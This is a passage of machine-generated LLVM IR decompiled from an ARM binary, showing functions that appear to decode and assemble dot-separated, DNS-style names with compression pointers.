  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14bd0 = load i32, i32* @r4, align 4
  store i32 %v3_14bd0, i32* %stack_var_-24, align 4
  %v6_14bd0 = load i32, i32* @r5, align 4
  %v9_14bd0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14bd8 = load i32, i32* @r1, align 4
  store i32 %v0_14bd8, i32* @r6, align 4
  %v0_14bdc = load i32, i32* @r2, align 4
  store i32 %v0_14bdc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c4419 = icmp slt i8* %arg1, null
  store i1 %v1_14c4419, i1* %cpsr_n.global-to-local, align 1
  %v2_14c4420 = icmp eq i8* %arg1, null
  store i1 %v2_14c4420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c4420, label %dec_label_pc_14c5c, label %dec_label_pc_14c50

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14c50
  %v2_14be8 = call i32 @function_14ac8(i32 %v0_14be821, i32 46)
  store i32 %v2_14be8, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14bec = icmp slt i32 %v2_14be8, 0
  store i1 %v1_14bec, i1* %cpsr_n.global-to-local, align 1
  %v2_14bec = icmp eq i32 %v2_14be8, 0
  store i1 %v2_14bec, i1* %cpsr_z.global-to-local, align 1
  %v0_14bf0 = load i32, i32* @r4, align 4
  %v2_14bf0 = sub i32 %v2_14be8, %v0_14bf0
  store i32 %v2_14bf0, i32* %ip.global-to-local, align 4
  store i32 %v0_14bf0, i32* @r0, align 4
  br i1 %v2_14bec, label %dec_label_pc_14bfc, label %dec_label_pc_14c04

dec_label_pc_14bfc:                               ; preds = %dec_label_pc_14be8
  %v0_14bfc = call i32 @function_f030()
  store i32 %v0_14bfc, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14bfc, 16777216
  %v1_14c00 = sdiv i32 %sext, 16777216
  store i32 %v1_14c00, i32* %ip.global-to-local, align 4
  %v0_14c10.pre = load i32, i32* @r4, align 4
  %v0_14c20.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14c04

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14be8, %dec_label_pc_14bfc
  %v0_14c20 = phi i32 [ %v2_14be8, %dec_label_pc_14be8 ], [ %v0_14c20.pre, %dec_label_pc_14bfc ]
  %v0_14c10 = phi i32 [ %v0_14bf0, %dec_label_pc_14be8 ], [ %v0_14c10.pre, %dec_label_pc_14bfc ]
  %v0_14c30 = phi i32 [ %v2_14bf0, %dec_label_pc_14be8 ], [ %v1_14c00, %dec_label_pc_14bfc ]
  %v0_14c04 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c04 = add i32 %v0_14c04, 1
  store i32 %v1_14c04, i32* @lr, align 4
  %v1_14c08 = load i32, i32* %r8.global-to-local, align 4
  %v2_14c08 = sub i32 %v1_14c08, %v0_14c04
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c0c = icmp slt i32 %v0_14c30, 0
  store i1 %v1_14c0c, i1* %cpsr_n.global-to-local, align 1
  %v2_14c0c = icmp eq i32 %v0_14c30, 0
  store i1 %v2_14c0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14c10, i32* @r1, align 4
  %v0_14c14 = load i32, i32* @r6, align 4
  %v2_14c14 = add i32 %v0_14c14, %v1_14c04
  store i32 %v2_14c14, i32* @r0, align 4
  store i32 %v0_14c30, i32* @r2, align 4
  %v1_14c1c = add i32 %v2_14c08, -1
  %v1_14c20 = add i32 %v0_14c20, 1
  store i32 %v1_14c20, i32* @r4, align 4
  br i1 %v2_14c0c, label %.loopexit, label %dec_label_pc_14c28

dec_label_pc_14c28:                               ; preds = %dec_label_pc_14c04
  %v2_14c28 = sub i32 %v0_14c30, %v1_14c1c
  %v3_14c28 = icmp ult i32 %v0_14c30, %v1_14c1c
  %v4_14c28 = xor i32 %v1_14c1c, %v0_14c30
  %v5_14c28 = xor i32 %v2_14c28, %v0_14c30
  %v6_14c28 = and i32 %v5_14c28, %v4_14c28
  %v7_14c28 = icmp slt i32 %v6_14c28, 0
  store i1 %v7_14c28, i1* %cpsr_v.global-to-local, align 1
  %v8_14c28 = icmp slt i32 %v2_14c28, 0
  store i1 %v8_14c28, i1* %cpsr_n.global-to-local, align 1
  %v9_14c28 = icmp eq i32 %v0_14c30, %v1_14c1c
  store i1 %v9_14c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14c28, label %dec_label_pc_14c30, label %.loopexit

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14c28
  %v1_14c30 = trunc i32 %v0_14c30 to i8
  %v4_14c30 = add i32 %v0_14c14, %v0_14c04
  %v5_14c30 = inttoptr i32 %v4_14c30 to i8*
  store i8 %v1_14c30, i8* %v5_14c30, align 1
  %v0_14c34 = load i32, i32* @lr, align 4
  %v1_14c34 = load i32, i32* %ip.global-to-local, align 4
  %v2_14c34 = add i32 %v1_14c34, %v0_14c34
  store i32 %v2_14c34, i32* %r7.global-to-local, align 4
  %v0_14c38 = call i32 @function_ef60()
  store i32 %v0_14c38, i32* %r0.global-to-local, align 4
  %v0_14c3c = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c3c = icmp slt i32 %v0_14c3c, 0
  store i1 %v1_14c3c, i1* %cpsr_n.global-to-local, align 1
  %v2_14c3c = icmp eq i32 %v0_14c3c, 0
  store i1 %v2_14c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c3c, label %dec_label_pc_14c5c, label %dec_label_pc_14c30.dec_label_pc_14c44_crit_edge

dec_label_pc_14c30.dec_label_pc_14c44_crit_edge:  ; preds = %dec_label_pc_14c30
  %v0_14c44.pre = load i32, i32* @r4, align 4
  store i32 %v0_14c44.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c44 = icmp slt i32 %v0_14c44.pre, 0
  store i1 %v1_14c44, i1* %cpsr_n.global-to-local, align 1
  %v2_14c44 = icmp eq i32 %v0_14c44.pre, 0
  store i1 %v2_14c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c44, label %dec_label_pc_14c5c, label %dec_label_pc_14c50

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14c30.dec_label_pc_14c44_crit_edge
  %v0_14be821 = phi i32 [ %v0_14c44.pre, %dec_label_pc_14c30.dec_label_pc_14c44_crit_edge ], [ %tmp, %dec_label_pc_14bd0 ]
  %v1_14c50 = inttoptr i32 %v0_14be821 to i8*
  %v2_14c50 = load i8, i8* %v1_14c50, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14c54 = icmp eq i8 %v2_14c50, 0
  store i1 %v2_14c54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c54, label %dec_label_pc_14c5c, label %dec_label_pc_14be8

dec_label_pc_14c5c:                               ; preds = %dec_label_pc_14c30, %dec_label_pc_14c30.dec_label_pc_14c44_crit_edge, %dec_label_pc_14c50, %dec_label_pc_14bd0
  %v0_14c5c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14c5c = icmp slt i32 %v0_14c5c, 0
  store i1 %v1_14c5c, i1* %cpsr_n.global-to-local, align 1
  %v2_14c5c = icmp eq i32 %v0_14c5c, 0
  store i1 %v2_14c5c, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_14c5c, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14c5c
  %v5_14c64 = load i32, i32* %r7.global-to-local, align 4
  %v6_14c64 = add i32 %v5_14c64, 1
  store i32 %v6_14c64, i32* %r0.global-to-local, align 4
  %v7_14c68 = load i32, i32* @r6, align 4
  %v9_14c68 = add i32 %v7_14c68, %v5_14c64
  %v10_14c68 = inttoptr i32 %v9_14c68 to i8*
  store i8 0, i8* %v10_14c68, align 1
  %v0_14c6c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_14c6c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14c6c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14c5c, %bb
  %v2_14c6c = phi i1 [ %v2_14c6c.pre, %bb ], [ false, %dec_label_pc_14c5c ]
  %v1_14c6c = phi i1 [ %v1_14c6c.pre, %bb ], [ %v1_14c5c, %dec_label_pc_14c5c ]
  %v0_14c6c = phi i1 [ %v0_14c6c.pre, %bb ], [ %v2_14c5c, %dec_label_pc_14c5c ]
  %v3_14c6c = xor i1 %v2_14c6c, %v1_14c6c
  %v4_14c6c = or i1 %v0_14c6c, %v3_14c6c
  br i1 %v4_14c6c, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_14c6c = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_14c6c, i32* @r4, align 4
  store i32 %v6_14bd0, i32* @r5, align 4
  store i32 %v9_14bd0, i32* @r6, align 4
  %v25_14c6c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_14c6c

.loopexit:                                        ; preds = %dec_label_pc_14c28, %dec_label_pc_14c04, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14c74 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14c74, i32* @r4, align 4
  store i32 %v6_14bd0, i32* @r5, align 4
  store i32 %v9_14bd0, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14c5c, { 0, 2, 1 }
  uselistorder i32 %v0_14c44.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14c3c, { 1, 0 }
  uselistorder i32 %v2_14c28, { 1, 0 }
  uselistorder i32 %v1_14c1c, { 2, 0, 3, 1 }
  uselistorder i32 %v0_14c30, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_14c00, { 1, 0 }
  uselistorder i1 %v2_14c4420, { 1, 0 }
  uselistorder i32 %v9_14bd0, { 1, 0 }
  uselistorder i32 %v6_14bd0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 3, 7, 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 6, 3, 4, 7, 8, 1, 2, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 6, 3, 4, 7, 8, 1, 2, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 5, 6, 3, 4, 7, 8, 1, 2, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 47, 46, 29, 28, 30, 31, 32, 33, 36, 34, 37, 35, 39, 38, 41, 40, 43, 42, 45, 44 }
  uselistorder i32 ()* @function_f030, { 13, 32, 11, 6, 12, 8, 7, 5, 10, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 3, 9, 2, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @function_14ac8, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder i8* null, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* @r6, { 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 11, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 1, 0, 13, 14, 15, 16, 17, 87, 2, 88, 89, 90, 91, 92, 93, 94, 123, 3, 124, 125, 126, 95, 97, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 4, 140, 141, 142, 143, 144, 145, 146, 195, 201, 196, 45, 46, 18, 19, 20, 47, 48, 49, 50, 26, 27, 28, 29, 30, 31, 32, 33, 173, 174, 175, 112, 113, 5, 114, 115, 116, 117, 118, 119, 6, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 176, 177, 178, 179, 180, 7, 12, 181, 34, 8, 35, 36, 120, 121, 122, 182, 9, 183, 184, 157, 158, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 21, 22, 23, 159, 160, 161, 162, 24, 197, 198, 199, 200, 25, 185, 186, 187, 188, 10, 189, 190, 191, 192, 44, 193, 194, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_14c5c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14c50, { 1, 0 }
  uselistorder label %dec_label_pc_14c04, { 1, 0 }
}

define i32 @function_14c78() local_unnamed_addr {
dec_label_pc_14c78:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14c78 = load i32, i32* @r4, align 4
  %v6_14c78 = load i32, i32* @r5, align 4
  %v0_14c7c = load i32, i32* @r0, align 4
  store i32 %v0_14c7c, i32* %sl.global-to-local, align 4
  %v2_14c7c = icmp eq i32 %v0_14c7c, 0
  br i1 %v2_14c7c, label %.thread16, label %dec_label_pc_14d1c.preheader

.thread16:                                        ; preds = %dec_label_pc_14c78
  %v0_14c881 = load i32, i32* @r2, align 4
  store i32 %v0_14c881, i32* %sb.global-to-local, align 4
  %v0_14c8c2 = load i32, i32* @r3, align 4
  store i32 %v0_14c8c2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_14d3c

dec_label_pc_14d1c.preheader:                     ; preds = %dec_label_pc_14c78
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_14c88 = load i32, i32* @r2, align 4
  store i32 %v0_14c88, i32* %sb.global-to-local, align 4
  %v0_14c8c = load i32, i32* @r3, align 4
  store i32 %v0_14c8c, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_14d1c3952 = load i32, i32* @r1, align 4
  %v2_14d1c4053 = add i32 %v1_14d1c3952, %v0_14c7c
  %v3_14d1c4154 = inttoptr i32 %v2_14d1c4053 to i8*
  %v4_14d1c4255 = load i8, i8* %v3_14d1c4154, align 1
  %v6_14d1c4356 = zext i8 %v4_14d1c4255 to i32
  store i32 %v6_14d1c4356, i32* @r4, align 4
  %v2_14d204457 = icmp eq i8 %v4_14d1c4255, 0
  br i1 %v2_14d204457, label %bb35, label %dec_label_pc_14ca0.lr.ph

dec_label_pc_14ca0:                               ; preds = %dec_label_pc_14ca0.lr.ph, %bb30
  %v2_14d2850 = phi i1 [ %v2_14d284663, %dec_label_pc_14ca0.lr.ph ], [ true, %bb30 ]
  %v6_14d1c48 = phi i32 [ %v6_14d1c4361, %dec_label_pc_14ca0.lr.ph ], [ %v6_14d1c, %bb30 ]
  %v1_14d1c47 = phi i32 [ %v1_14d1c3960, %dec_label_pc_14ca0.lr.ph ], [ %v5_14cc8, %bb30 ]
  %v1_14ca4 = and i32 %v6_14d1c48, 192
  br i1 %v2_14d2850, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_14ca0
  %v1_14ca8 = load i32, i32* %r8.global-to-local, align 4
  %v2_14ca8 = add i32 %v1_14ca8, 1
  store i32 %v2_14ca8, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_14ca0, %bb
  %v2_14cac = icmp eq i32 %v1_14ca4, 192
  %v1_14cb0 = add i32 %v1_14d1c47, 1
  store i32 %v1_14cb0, i32* @r5, align 4
  br i1 %v2_14cac, label %dec_label_pc_14cb8, label %dec_label_pc_14cd8

dec_label_pc_14cb8:                               ; preds = %bb28
  %v2_14cb8 = add i32 %v1_14cb0, %v0_14cb8.ph59
  %v3_14cb8 = inttoptr i32 %v2_14cb8 to i8*
  %v4_14cb8 = load i8, i8* %v3_14cb8, align 1
  %v6_14cb8 = zext i8 %v4_14cb8 to i32
  %v1_14cc0 = urem i32 %v6_14d1c48, 64
  br i1 %v2_14d2850, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_14cb8
  %v1_14cc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_14cc4 = add i32 %v1_14cc4, 1
  store i32 %v2_14cc4, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_14cb8, %bb29
  %v4_14cc8 = mul nuw nsw i32 %v1_14cc0, 256
  %v5_14cc8 = or i32 %v6_14cb8, %v4_14cc8
  store i32 %v5_14cc8, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_14d1c = add i32 %v5_14cc8, %v0_14cb8.ph59
  %v3_14d1c = inttoptr i32 %v2_14d1c to i8*
  %v4_14d1c = load i8, i8* %v3_14d1c, align 1
  %v6_14d1c = zext i8 %v4_14d1c to i32
  store i32 %v6_14d1c, i32* @r4, align 4
  %v2_14d20 = icmp eq i8 %v4_14d1c, 0
  br i1 %v2_14d20, label %dec_label_pc_14d28.bb36_crit_edge, label %dec_label_pc_14ca0

dec_label_pc_14cd8:                               ; preds = %bb28
  %v2_14cd8 = add i32 %v6_14d1c48, %storemerge17.ph58
  store i32 %v2_14cd8, i32* %r6.global-to-local, align 4
  %v2_14cdc = load i32, i32* %stack_var_-40, align 4
  %v1_14ce0 = add i32 %v2_14cd8, 1
  store i32 %v1_14ce0, i32* %r7.global-to-local, align 4
  %v3_14ce4 = icmp ult i32 %v1_14ce0, %v2_14cdc
  br i1 %v3_14ce4, label %dec_label_pc_14cec, label %dec_label_pc_14d3c

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14cd8
  %v2_14cec = add i32 %v1_14cb0, %v0_14cb8.ph59
  store i32 %v2_14cec, i32* @r1, align 4
  %v0_14cf0 = load i32, i32* %sb.global-to-local, align 4
  %v2_14cf0 = add i32 %v0_14cf0, %storemerge17.ph58
  store i32 %v2_14cf0, i32* @r0, align 4
  store i32 %v6_14d1c48, i32* @r2, align 4
  %v0_14cf8 = call i32 @function_ef60()
  %v0_14cfc = load i32, i32* @r5, align 4
  %v1_14cfc = load i32, i32* @r4, align 4
  %v2_14cfc = add i32 %v1_14cfc, %v0_14cfc
  store i32 %v2_14cfc, i32* %r1.global-to-local, align 4
  %v0_14d00 = load i32, i32* %sl.global-to-local, align 4
  %v2_14d00 = add i32 %v0_14d00, %v2_14cfc
  %v3_14d00 = inttoptr i32 %v2_14d00 to i8*
  %v4_14d00 = load i8, i8* %v3_14d00, align 1
  %v0_14d04 = load i32, i32* %fp.global-to-local, align 4
  %v2_14d04 = icmp eq i32 %v0_14d04, 0
  br i1 %v2_14d04, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14cec
  %v1_14d08 = load i32, i32* %r8.global-to-local, align 4
  %v3_14d08 = add i32 %v1_14d08, %v1_14cfc
  store i32 %v3_14d08, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_14cec, %bb31
  %v2_14d0c = icmp eq i8 %v4_14d00, 0
  br i1 %v2_14d0c, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_14d14.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_14d14 = load i32, i32* %sb.global-to-local, align 4
  %v3_14d14 = load i32, i32* %r6.global-to-local, align 4
  %v4_14d14 = add i32 %v3_14d14, %v2_14d14
  %v5_14d14 = inttoptr i32 %v4_14d14 to i8*
  store i8 %v0_14d14.off0, i8* %v5_14d14, align 1
  %v0_14d18.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14d1c.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_14d28.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_14d1c39 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d1c40 = add i32 %v1_14d1c39, %v0_14d1c.pre.pre
  %v3_14d1c41 = inttoptr i32 %v2_14d1c40 to i8*
  %v4_14d1c42 = load i8, i8* %v3_14d1c41, align 1
  %v6_14d1c43 = zext i8 %v4_14d1c42 to i32
  store i32 %v6_14d1c43, i32* @r4, align 4
  %v2_14d2044 = icmp eq i8 %v4_14d1c42, 0
  %v2_14d2846 = icmp eq i32 %v0_14d28.pre.pre, 0
  br i1 %v2_14d2044, label %dec_label_pc_14d28, label %dec_label_pc_14ca0.lr.ph

dec_label_pc_14ca0.lr.ph:                         ; preds = %dec_label_pc_14d1c.preheader, %bb34
  %v2_14d284663 = phi i1 [ %v2_14d2846, %bb34 ], [ false, %dec_label_pc_14d1c.preheader ]
  %v6_14d1c4361 = phi i32 [ %v6_14d1c43, %bb34 ], [ %v6_14d1c4356, %dec_label_pc_14d1c.preheader ]
  %v1_14d1c3960 = phi i32 [ %v1_14d1c39, %bb34 ], [ %v1_14d1c3952, %dec_label_pc_14d1c.preheader ]
  %v0_14cb8.ph59 = phi i32 [ %v0_14d1c.pre.pre, %bb34 ], [ %v0_14c7c, %dec_label_pc_14d1c.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_14d18.pre, %bb34 ], [ 0, %dec_label_pc_14d1c.preheader ]
  br label %dec_label_pc_14ca0

dec_label_pc_14d28:                               ; preds = %bb34
  br i1 %v2_14d2846, label %dec_label_pc_14d28.bb36_crit_edge, label %bb35

dec_label_pc_14d28.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_14d28
  %v0_14d30.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14d3c

bb35:                                             ; preds = %dec_label_pc_14d1c.preheader, %dec_label_pc_14d28
  %v1_14d2c = load i32, i32* %r8.global-to-local, align 4
  %v2_14d2c = add i32 %v1_14d2c, 1
  store i32 %v2_14d2c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14d3c

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14cd8, %bb35, %dec_label_pc_14d28.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_14d30.pre, %dec_label_pc_14d28.bb36_crit_edge ], [ %v2_14d2c, %bb35 ], [ -1, %dec_label_pc_14cd8 ]
  store i32 %v3_14c78, i32* @r4, align 4
  store i32 %v6_14c78, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_14cb8.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_14d1c, { 1, 0 }
  uselistorder i32 %v5_14cc8, { 0, 2, 1 }
  uselistorder i32 %v6_14d1c48, { 2, 1, 0, 3 }
  uselistorder i1 %v2_14d2850, { 1, 0 }
  uselistorder i32 %v0_14c7c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 10, 42, 37, 43, 44, 45, 46, 47, 4, 76, 5, 48, 15, 49, 50, 51, 14, 52, 53, 54, 55, 56, 57, 58, 59, 60, 41, 17, 61, 29, 18, 30, 62, 63, 64, 20, 19, 11, 12, 65, 66, 67, 13, 21, 68, 31, 32, 69, 33, 34, 22, 38, 39, 6, 23, 70, 35, 36, 71, 72, 16, 24, 73, 74, 75, 40, 77, 3, 2, 7, 1, 27, 26, 28, 25, 8, 9, 78 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 ()* @function_ef60, { 5, 4, 13, 17, 16, 15, 14, 2, 11, 10, 1, 0, 21, 6, 9, 8, 7, 22, 20, 19, 18, 12, 3 }
  uselistorder i32 64, { 0, 6, 2, 3, 4, 11, 7, 8, 5, 1, 9, 10 }
  uselistorder i32* @r3, { 5, 0, 6, 7, 8, 9, 10, 11, 12, 1, 20, 15, 18, 16, 17, 21, 22, 19, 13, 4, 14, 3, 2 }
  uselistorder i32* @r2, { 75, 76, 10, 77, 78, 14, 79, 80, 13, 19, 20, 21, 81, 82, 83, 123, 11, 100, 84, 85, 86, 87, 88, 24, 12, 7, 141, 142, 143, 144, 101, 102, 2, 103, 104, 105, 124, 125, 8, 106, 15, 22, 145, 146, 16, 17, 147, 148, 3, 149, 151, 152, 156, 37, 150, 126, 130, 131, 134, 132, 133, 127, 128, 129, 25, 89, 153, 26, 107, 108, 109, 5, 90, 1, 154, 6, 155, 110, 111, 112, 113, 9, 114, 115, 4, 116, 0, 117, 23, 135, 136, 137, 38, 39, 118, 40, 119, 18, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 91, 92, 93, 94, 95, 96, 97, 98, 122, 138, 139, 140, 99, 120, 121 }
  uselistorder i32* @r5, { 87, 88, 89, 90, 91, 92, 93, 8, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 6, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 26, 29, 9, 4, 30, 123, 127, 124, 125, 126, 22, 132, 128, 129, 130, 131, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 10, 189, 190, 133, 134, 11, 136, 135, 5, 140, 12, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 154, 24, 156, 42, 43, 44, 45, 46, 47, 284, 285, 191, 192, 193, 194, 195, 196, 197, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 198, 199, 1, 200, 201, 202, 203, 204, 205, 68, 69, 70, 298, 299, 300, 301, 302, 2, 303, 304, 305, 76, 77, 78, 79, 80, 81, 31, 32, 33, 34, 35, 36, 37, 82, 13, 0, 83, 84, 85, 48, 49, 50, 51, 52, 53, 54, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 306, 307, 308, 309, 137, 138, 139, 206, 14, 207, 208, 209, 210, 211, 15, 212, 213, 214, 215, 216, 168, 169, 170, 171, 172, 173, 16, 267, 268, 269, 17, 270, 271, 55, 56, 57, 174, 175, 176, 177, 272, 273, 274, 217, 218, 27, 219, 220, 18, 221, 222, 223, 224, 225, 226, 25, 227, 228, 229, 230, 28, 234, 19, 235, 236, 237, 238, 239, 240, 241, 242, 7, 243, 244, 245, 246, 247, 248, 38, 39, 231, 3, 232, 233, 41, 40, 23, 310, 311, 275, 276, 277, 278, 20, 279, 280, 71, 72, 73, 74, 21, 75, 249, 250, 251, 252, 253, 254, 281, 282, 283, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 86 }
  uselistorder label %dec_label_pc_14d3c, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_14d28.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14ca0.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_14d44() local_unnamed_addr {
dec_label_pc_14d44:
  %v0_14d48 = load i32, i32* @r0, align 4
  store i32 %v0_14d48, i32* @lr, align 4
  %v2_14d48 = icmp eq i32 %v0_14d48, 0
  br i1 %v2_14d48, label %bb, label %dec_label_pc_14d60

bb:                                               ; preds = %dec_label_pc_14d44
  ret i32 -1

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d68
  %v1_14d58 = add i32 %v1_14d70, 2
  br label %dec_label_pc_14d88

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d44
  %v0_14d60 = load i32, i32* @r1, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d70
  %v1_14d7c = and i32 %v6_14d70, 192
  %v2_14d80 = add i32 %v6_14d70, %v1_14d74
  %v2_14d68 = icmp eq i32 %v1_14d7c, 192
  br i1 %v2_14d68, label %dec_label_pc_14d58, label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d68, %dec_label_pc_14d60
  %v1_14d70 = phi i32 [ %v2_14d80, %dec_label_pc_14d68 ], [ %v0_14d60, %dec_label_pc_14d60 ]
  %v2_14d70 = add i32 %v1_14d70, %v0_14d48
  %v3_14d70 = inttoptr i32 %v2_14d70 to i8*
  %v4_14d70 = load i8, i8* %v3_14d70, align 1
